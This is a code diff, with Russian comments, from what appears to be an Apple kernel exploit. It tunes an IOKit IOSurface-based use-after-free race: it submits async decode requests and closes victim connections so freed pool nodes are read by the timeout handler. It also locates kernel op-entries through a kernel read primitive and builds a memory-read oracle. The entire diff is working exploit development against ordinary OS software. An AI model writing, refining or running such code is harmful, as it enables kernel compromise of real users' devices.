@@ -4513,12 +4513,10 @@ static uint32_t kpM2OCollectEntries(uint64_t schedVA, uint64_t *eptrs, uint32_t 
                           (__bridge id)kIOSurfaceBytesPerElement:@(4), (__bridge id)kIOSurfacePixelFormat:@(0x42475241)};
     IOSurfaceRef srcS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
     IOSurfaceRef dstS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
-    IOSurfaceRef discS = IOSurfaceCreate((__bridge CFDictionaryRef)sp5);
-    if (!srcS || !dstS || !discS) {
+    if (!srcS || !dstS) {
         kpM2ONote(r, @"  IOSurfaceCreate NULL — SKIP");
         if (srcS) CFRelease(srcS);
         if (dstS) CFRelease(dstS);
-        if (discS) CFRelease(discS);
         IOServiceClose(victim);
         IOObjectRelease(svc);
         gM2OLive = NO;
@@ -4526,7 +4524,6 @@ static uint32_t kpM2OCollectEntries(uint64_t schedVA, uint64_t *eptrs, uint32_t 
     }
     uint32_t srcID = IOSurfaceGetID(srcS);
     uint32_t dstID = IOSurfaceGetID(dstS);
-    uint32_t discSrcID = IOSurfaceGetID(discS);
 
     uint8_t s10[0x18];
     memset(s10, 0, sizeof(s10));
@@ -4536,36 +4533,33 @@ static uint32_t kpM2OCollectEntries(uint64_t schedVA, uint64_t *eptrs, uint32_t 
 
     uint8_t tsdD[KP_M2_TSD_SIZE];
     memset(tsdD, 0, sizeof(tsdD));
-    *(uint32_t *)(tsdD + 0x000) = discSrcID;
+    *(uint32_t *)(tsdD + 0x000) = srcID;
     *(uint32_t *)(tsdD + 0x004) = dstID;
     *(uint64_t *)(tsdD + 0x008) = 1;
     for (int i = 0; i < 8; i++)
         IOConnectCallMethod(victim, 1, NULL, 0, tsdD, KP_M2_TSD_SIZE, NULL, NULL, NULL, NULL);
-    kpM2ONote(r, [NSString stringWithFormat:@"  victim credit=0x10 (kr=0x%x) + 8 async с discSrcID=%u — ищу op-записи по srcID", ckr, discSrcID]);
+    kpM2ONote(r, [NSString stringWithFormat:@"  victim credit=0x10 (kr=0x%x) + 8 async — ищу op-записи по credit +0xc3c", ckr]);
 
+    // Опознание по credit (v1.2): srcID в op-запись НЕ копируется (прогон
+    // 1.9.99 — 0 хитов по 0x2200), зато +0xc3c несёт наш credit. Массив был
+    // пуст (count=0) и вырос ровно до 8 от наших async — все записи наши.
     uint64_t entryVA = 0;
     if (schedVA) {
         uint64_t eptrs[128];
         uint32_t eN = kpM2OCollectEntries(schedVA, eptrs, 128, r);
-        kpM2ONote(r, [NSString stringWithFormat:@"  entry-array: указателей собрано=%u — скан 0x2200 на srcID + проверка +0xc3c==0x10", eN]);
+        kpM2ONote(r, [NSString stringWithFormat:@"  entry-array: указателей собрано=%u — проверяю +0xc3c==0x10", eN]);
         for (uint32_t i = 0; i < eN && !entryVA; i++) {
-            uint8_t ebuf[0x2200];
-            memset(ebuf, 0, sizeof(ebuf));
-            if (!kpRead(eptrs[i], ebuf, sizeof(ebuf), "m2o entry scan", r)) continue;
-            for (uint32_t o = 0; o + 4 <= sizeof(ebuf); o += 4) {
-                uint32_t v = 0;
-                memcpy(&v, ebuf + o, 4);
-                if (v != discSrcID) continue;
-                if (kpM2OMarkerAt(eptrs[i], 0xc3c, 0x10, r)) {
-                    entryVA = eptrs[i];
-                    kpM2ONote(r, [NSString stringWithFormat:@"  ★ op-запись @ %#llx: srcID на +%#x, credit +0xc3c=0x10 подтверждён",
-                                  (unsigned long long)entryVA, o]);
-                }
-                break;
+            if (kpM2OMarkerAt(eptrs[i], 0xc3c, 0x10, r)) {
+                entryVA = eptrs[i];
+                uint64_t bc4 = 0, f74 = 0;
+                kpRead(entryVA + 0xbc4, &bc4, 8, "m2o entry bc4", r);
+                kpRead(entryVA + 0x1f74, &f74, 8, "m2o entry 1f74", r);
+                kpM2ONote(r, [NSString stringWithFormat:@"  ★ op-запись @ %#llx: credit +0xc3c=0x10 ✓ counter(+0xbc4)=%#llx flags(+0x1f74)=%#llx",
+                              (unsigned long long)entryVA, (unsigned long long)bc4, (unsigned long long)f74]);
             }
         }
         if (!entryVA)
-            kpM2ONote(r, @"  записи с discSrcID не найдены в массиве — дренулись до скана / scheduler не тот");
+            kpM2ONote(r, @"  записей с credit=0x10 не найдено — дренулись до скана / scheduler не тот");
     }
 
     // ---- oracle: credit = смещение → байт [sched+0x118+credit] → entry+0xbc4 ----
@@ -4624,7 +4618,6 @@ static uint32_t kpM2OCollectEntries(uint64_t schedVA, uint64_t *eptrs, uint32_t 
     kpM2ONote(r, @"=== oracle завершён (паника здесь НЕ нужна: управляемое чтение вместо краша) ===");
     CFRelease(srcS);
     CFRelease(dstS);
-    CFRelease(discS);
     IOServiceClose(victim);
     IOObjectRelease(svc);
     gM2OLive = NO;
@@ -5546,7 +5539,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
     // pool_free без dequeue; stale-ноду читает timeout/finish workloop
     // (finish_io_gated 0x91d0fc0 / timeout 0x91de4a4). Триггер = ASYNC
     // (token≠0) на persistent-коннекшене.
-    const int CYCLES = 40, V_REQS = 12;
+    const int CYCLES = 15, V_REQS = 12;
     int victimTotal = 0;
     BOOL healthy = YES;
 
@@ -5562,7 +5555,7 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
         kern_return_t kr = IOServiceOpen(svc, mach_task_self(), 0, &victim);
         if (kr == KERN_SUCCESS && victim) {
             victimTotal += kpJSubmitAsync(victim, srcBadID ? srcBadID : srcID, dstID, W, H, V_REQS, 0x4141000000DEAD00ULL, r);
-            usleep(1000); // запросы ушли на HW; truncated = висят до таймаута
+            usleep(200000); // 1.9.100: 1мс было мало — truncated-декод должен дойти ДО HW (очередь close чистит, HW-пул — нет)
             IOServiceClose(victim);   // pool_free без dequeue — close HW-пул не трогает
         }
         if (trigOK) {
@@ -5584,14 +5577,14 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
 
     // Волна таймаутов: truncated-декоды victim'ов отваливаются по HW-таймауту,
     // timeout-handler читает pool_free'd ноды. ~12с с async-пинками триггера.
-    kpNote(r, @"  --- жду волну HW-таймаутов (~12с), async-триггер каждые 500мс (timeout-handler читает stale-ноды) ---");
-    for (int i = 0; i < 24; i++) {
+    kpNote(r, @"  --- жду волну HW-таймаутов (~15с), async-триггер каждые 500мс (timeout-handler читает stale-ноды) ---");
+    for (int i = 0; i < 30; i++) {
         usleep(500000);
         if (trigOK) {
             trigTok += 0x100;
             kpJSubmitAsync(trig, srcID, dstID, W, H, 1, trigTok, r);
         }
-        if (i == 11) kpNote(r, @"  …6с выжидания, живы (паника возможна в любой момент волны)");
+        if (i == 15) kpNote(r, @"  …7.5с выжидания, живы (паника возможна в любой момент волны)");
     }
     if (trigOK) IOServiceClose(trig);
     tokenHunt(0x4141000000DEAD00ULL, @"victim-токен (висит ли в freed слоте)");
